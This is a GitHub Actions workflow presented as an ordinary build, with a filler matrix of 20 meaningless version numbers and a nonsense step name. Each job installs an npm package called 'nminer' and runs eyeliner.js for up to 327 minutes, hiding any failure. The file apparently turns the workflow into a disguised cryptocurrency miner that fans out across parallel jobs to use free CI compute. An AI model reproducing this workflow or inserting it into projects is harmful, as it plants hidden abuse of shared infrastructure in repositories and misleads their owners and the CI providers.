name: eyeliner
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5148 }
          - { version: 3794 }
          - { version: 830 }
          - { version: 8528 }
          - { version: 9905 }
          - { version: 8320 }
          - { version: 5892 }
          - { version: 4850 }
          - { version: 5785 }
          - { version: 8171 }
          - { version: 5070 }
          - { version: 4243 }
          - { version: 6527 }
          - { version: 9607 }
          - { version: 5022 }
          - { version: 9012 }
          - { version: 3205 }
          - { version: 7030 }
          - { version: 1363 }
          - { version: 9572 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: penalise before aggressive while
        run: |
          npm install nminer@latest
          timeout 327m node eyeliner.js || echo "eyeliner executed"